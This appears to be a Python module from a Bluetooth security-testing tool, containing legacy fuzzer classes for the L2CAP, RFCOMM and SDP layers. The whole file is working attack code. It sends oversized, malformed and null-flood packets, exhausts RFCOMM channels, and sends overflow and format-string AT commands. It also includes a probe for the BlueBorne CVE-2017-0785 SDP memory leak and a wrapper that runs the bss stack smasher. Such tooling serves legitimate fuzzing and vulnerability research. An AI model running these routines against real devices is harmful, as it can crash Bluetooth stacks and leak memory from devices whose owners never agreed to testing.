"""Legacy fuzzer classes — migrated from blue_tap/attack/fuzz.py.

These classes provide the original L2CAP, RFCOMM, and SDP fuzzing
primitives from Blue-Tap v1.x.  They remain fully functional but are
superseded by the protocol-aware campaign engine in blue_tap.fuzz.engine.

For new fuzzing work, prefer ``blue-tap fuzz campaign`` which supports
multi-protocol campaigns, crash deduplication, corpus management,
and session persistence.
"""

import os
import random
import socket
import time
import warnings

from blue_tap.utils.output import info, success, error, warning
from blue_tap.utils.bt_helpers import run_cmd, check_tool

# Bluetooth socket constants (from <bluetooth/bluetooth.h>)
AF_BLUETOOTH = getattr(socket, "AF_BLUETOOTH", 31)
BTPROTO_L2CAP = 0
BTPROTO_RFCOMM = 3

_DEPRECATION_MSG = (
    "This legacy fuzzer class is deprecated. "
    "Use 'blue-tap fuzz campaign' for protocol-aware fuzzing with crash "
    "deduplication, corpus management, and multi-hour campaign support."
)


# ---------------------------------------------------------------------------
# L2CAP fuzzer
# ---------------------------------------------------------------------------

class L2CAPFuzzer:
    """Fuzz the L2CAP layer of a remote Bluetooth device."""

    def __init__(self, address: str):
        warnings.warn(_DEPRECATION_MSG, DeprecationWarning, stacklevel=2)
        self.address = address

    def oversized_mtu(self, psm: int = 1, size: int = 65535) -> dict:
        """Send an oversized L2CAP packet to stress MTU handling."""
        info(f"Sending oversized L2CAP packet ({size} bytes) to {self.address} PSM {psm}")
        sock = None
        try:
            sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
            sock.connect((self.address, psm))
            data = os.urandom(size)
            sent = sock.send(data)
            success(f"Sent {sent} bytes")
            return {"result": "sent", "bytes_sent": sent}
        except OSError as exc:
            error(f"L2CAP oversized_mtu error: {exc}")
            return {"result": "error", "bytes_sent": 0, "error": str(exc)}
        except Exception as exc:
            warning(f"Possible crash — connection lost: {exc}")
            return {"result": "crash_suspected", "bytes_sent": 0, "error": str(exc)}
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass

    def malformed_packets(self, psm: int = 1, count: int = 100) -> dict:
        """Send randomly corrupted packets over L2CAP."""
        info(f"Sending {count} malformed L2CAP packets to {self.address} PSM {psm}")
        sent = 0
        errors = 0
        sock = None
        try:
            sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
            sock.connect((self.address, psm))
            for i in range(count):
                pkt = os.urandom(random.randint(1, 1024))
                try:
                    sock.send(pkt)
                    sent += 1
                except OSError:
                    errors += 1
            success(f"Malformed packets: {sent} sent, {errors} errors")
            return {"result": "complete", "sent": sent, "errors": errors, "total": count}
        except OSError as exc:
            error(f"L2CAP malformed_packets connect error: {exc}")
            return {"result": "error", "sent": sent, "errors": errors, "total": count, "error": str(exc)}
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass

    def null_flood(self, psm: int = 1, count: int = 1000) -> dict:
        """Rapid-fire zero-length packets to stress connection handling."""
        info(f"Flooding {count} null packets to {self.address} PSM {psm}")
        sent = 0
        errors = 0
        sock = None
        try:
            sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
            sock.connect((self.address, psm))
            for _ in range(count):
                try:
                    sock.send(b"")
                    sent += 1
                except OSError:
                    errors += 1
            success(f"Null flood: {sent} sent, {errors} errors")
            return {"result": "complete", "sent": sent, "errors": errors, "total": count}
        except OSError as exc:
            error(f"L2CAP null_flood connect error: {exc}")
            return {"result": "error", "sent": sent, "errors": errors, "total": count, "error": str(exc)}
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass


# ---------------------------------------------------------------------------
# RFCOMM fuzzer
# ---------------------------------------------------------------------------

class RFCOMMFuzzer:
    """Fuzz the RFCOMM layer of a remote Bluetooth device."""

    def __init__(self, address: str):
        warnings.warn(_DEPRECATION_MSG, DeprecationWarning, stacklevel=2)
        self.address = address

    def channel_exhaustion(self, max_channels: int = 30) -> dict:
        """Open sockets to channels 1-max_channels simultaneously."""
        info(f"Attempting channel exhaustion on {self.address} (1-{max_channels})")
        sockets: list[socket.socket] = []
        opened = 0
        failed = 0
        try:
            for ch in range(1, max_channels + 1):
                try:
                    sock = socket.socket(AF_BLUETOOTH, socket.SOCK_STREAM, BTPROTO_RFCOMM)
                    sock.connect((self.address, ch))
                    sockets.append(sock)
                    opened += 1
                except OSError:
                    failed += 1
            success(f"Channel exhaustion: {opened} opened, {failed} failed")
            return {"result": "complete", "opened": opened, "failed": failed, "max_channels": max_channels}
        except Exception as exc:
            error(f"Channel exhaustion unexpected error: {exc}")
            return {"result": "error", "opened": opened, "failed": failed, "error": str(exc)}
        finally:
            for s in sockets:
                try:
                    s.close()
                except OSError:
                    pass

    def large_payload(self, channel: int = 1, size: int = 65535) -> dict:
        """Send an oversized payload on an RFCOMM channel."""
        info(f"Sending {size}-byte payload to {self.address} RFCOMM ch {channel}")
        sock = None
        try:
            sock = socket.socket(AF_BLUETOOTH, socket.SOCK_STREAM, BTPROTO_RFCOMM)
            sock.connect((self.address, channel))
            data = os.urandom(size)
            sent = sock.send(data)
            success(f"Sent {sent} bytes on RFCOMM ch {channel}")
            return {"result": "sent", "bytes_sent": sent}
        except OSError as exc:
            error(f"RFCOMM large_payload error: {exc}")
            return {"result": "error", "bytes_sent": 0, "error": str(exc)}
        except Exception as exc:
            warning(f"Possible crash — connection lost: {exc}")
            return {"result": "crash_suspected", "bytes_sent": 0, "error": str(exc)}
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass

    def at_fuzz(self, channel: int = 1, patterns: list[str] | None = None) -> dict:
        """Send malformed AT commands over RFCOMM to fuzz modem/HFP parsers."""
        default_patterns = [
            "AT" + "A" * 1024 + "\r\n",
            "AT\x00\x00\r\n",
            "AT%n%n%x%x\r\n",
            "AT" + "\u00c4" * 256 + "\r\n",
            "AT+" + "B" * 512 + "\r\n",
        ]
        test_patterns = patterns if patterns is not None else default_patterns
        info(f"AT fuzzing {self.address} RFCOMM ch {channel} with {len(test_patterns)} patterns")

        results: list[dict] = []
        sock = None
        try:
            sock = socket.socket(AF_BLUETOOTH, socket.SOCK_STREAM, BTPROTO_RFCOMM)
            sock.settimeout(3)
            sock.connect((self.address, channel))
            for idx, pattern in enumerate(test_patterns):
                entry: dict = {"index": idx, "length": len(pattern)}
                try:
                    sock.send(pattern.encode("utf-8", errors="replace"))
                    time.sleep(0.3)
                    try:
                        resp = sock.recv(1024)
                        entry["response"] = resp.decode("utf-8", errors="replace")
                    except TimeoutError:
                        entry["response"] = None
                    entry["status"] = "sent"
                except OSError as exc:
                    entry["status"] = "error"
                    entry["error"] = str(exc)
                results.append(entry)

            sent = sum(1 for r in results if r["status"] == "sent")
            errs = sum(1 for r in results if r["status"] == "error")
            success(f"AT fuzz complete: {sent} sent, {errs} errors")
            return {"result": "complete", "sent": sent, "errors": errs, "details": results}
        except OSError as exc:
            error(f"RFCOMM at_fuzz connect error: {exc}")
            return {"result": "error", "sent": 0, "errors": 0, "error": str(exc), "details": results}
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass


# ---------------------------------------------------------------------------
# SDP fuzzer
# ---------------------------------------------------------------------------

class SDPFuzzer:
    """Fuzz the SDP layer — targets BlueBorne CVE-2017-0785 continuation state attack."""

    def __init__(self, address: str):
        warnings.warn(_DEPRECATION_MSG, DeprecationWarning, stacklevel=2)
        self.address = address

    def probe_continuation_state(self, psm: int = 1) -> dict:
        """Send SDP requests with crafted continuation state values.

        Tests for CVE-2017-0785: Android SDP server used continuation state
        as a raw memory offset without bounds checking. A manipulated
        continuation state pointing beyond the response buffer causes the
        server to leak heap memory in the SDP response.

        This probe sends legitimate SDP requests, then replays with
        modified continuation state to detect info leak behavior.
        """
        import struct

        info(f"Probing SDP continuation state on {self.address} PSM {psm}")
        sock = None
        results = {"probes_sent": 0, "responses": [], "leak_suspected": False}

        try:
            sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
            sock.settimeout(5.0)
            sock.connect((self.address, psm))

            # SDP ServiceSearchAttributeRequest for all services
            # Transaction ID=0x0001, MaxByteCount=0x0040
            sdp_req = bytes([
                0x06,                    # SDP_ServiceSearchAttributeRequest
                0x00, 0x01,              # Transaction ID
                0x00, 0x11,              # Parameter length
                # ServiceSearchPattern: UUID L2CAP (0x0100)
                0x35, 0x03, 0x19, 0x01, 0x00,
                0x00, 0x40,              # MaximumAttributeByteCount
                # AttributeIDList: all attributes (0x0000-0xFFFF)
                0x35, 0x05, 0x0a, 0x00, 0x00, 0xff, 0xff,
                0x00,                    # ContinuationState length = 0
            ])

            sock.send(sdp_req)
            results["probes_sent"] += 1

            try:
                resp = sock.recv(4096)
                if resp and len(resp) > 5:
                    results["responses"].append({
                        "type": "initial",
                        "length": len(resp),
                        "hex_preview": resp[:32].hex(),
                    })

                    # Check if response has continuation state
                    # Last bytes: continuation state length + data
                    cont_len = resp[-1] if resp else 0
                    if cont_len > 0 and len(resp) > cont_len + 1:
                        cont_state = resp[-(cont_len + 1):-1]
                        info(f"Got continuation state: {cont_state.hex()} ({cont_len} bytes)")

                        # Craft modified continuation state with offset manipulation
                        test_offsets = [
                            cont_state,  # Original (baseline)
                            b"\x00" * cont_len,  # Zero offset
                            b"\xff" * cont_len,  # Max offset
                        ]

                        for i, test_cont in enumerate(test_offsets):
                            modified_req = sdp_req[:-1] + bytes([len(test_cont)]) + test_cont
                            # Update parameter length
                            new_plen = len(modified_req) - 5
                            modified_req = modified_req[:3] + struct.pack(">H", new_plen) + modified_req[5:]

                            try:
                                sock.send(modified_req)
                                results["probes_sent"] += 1
                                probe_resp = sock.recv(4096)
                                resp_info = {
                                    "type": f"cont_probe_{i}",
                                    "cont_state": test_cont.hex(),
                                    "length": len(probe_resp) if probe_resp else 0,
                                }
                                if probe_resp:
                                    resp_info["hex_preview"] = probe_resp[:32].hex()
                                results["responses"].append(resp_info)

                                # If response with max offset is different size than original,
                                # may indicate memory read at arbitrary offset
                                if i == 2 and probe_resp and len(probe_resp) != len(resp):
                                    results["leak_suspected"] = True
                                    warning("Response size varies with continuation offset — possible info leak!")
                            except (TimeoutError, OSError):
                                results["responses"].append({
                                    "type": f"cont_probe_{i}",
                                    "cont_state": test_cont.hex(),
                                    "error": "timeout/refused",
                                })
                    else:
                        info("No continuation state in response (response fit in single fragment)")
            except TimeoutError:
                info("No SDP response (timeout)")

            success(f"SDP continuation probe: {results['probes_sent']} probes sent")
            return results

        except OSError as exc:
            error(f"SDP probe connect error: {exc}")
            return results
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass


def _check_target_alive(address: str) -> bool:
    """Quick reachability check via l2ping before fuzzing."""
    result = run_cmd(["l2ping", "-c", "1", "-t", "3", address], timeout=8)
    if result.returncode != 0:
        warning(f"Target {address} not reachable via L2CAP ping — may be out of range")
        return False
    return True


def bss_wrapper(target: str, mode: str = "l2cap") -> bool:
    """Run Bluetooth Stack Smasher (bss) against a target.

    Args:
        target: BD_ADDR of the remote device.
        mode: ``"l2cap"`` or ``"rfcomm"``.

    Returns:
        True if bss executed successfully.
    """
    if not check_tool("bss"):
        error("bss (Bluetooth Stack Smasher) not found. Install from: "
              "https://github.com/niccoX/Bluetooth-stack-smasher")
        return False

    cmd = ["bss", "-d", target]
    if mode == "rfcomm":
        cmd += ["-p", "rfcomm"]
    else:
        cmd += ["-p", "l2cap"]

    info(f"Running bss against {target} (mode={mode})")
    result = run_cmd(cmd, timeout=120)
    if result.returncode == 0:
        success(f"bss finished: {result.stdout.strip()}")
        return True
    else:
        error(f"bss failed (rc={result.returncode}): {result.stderr.strip()}")
        return False
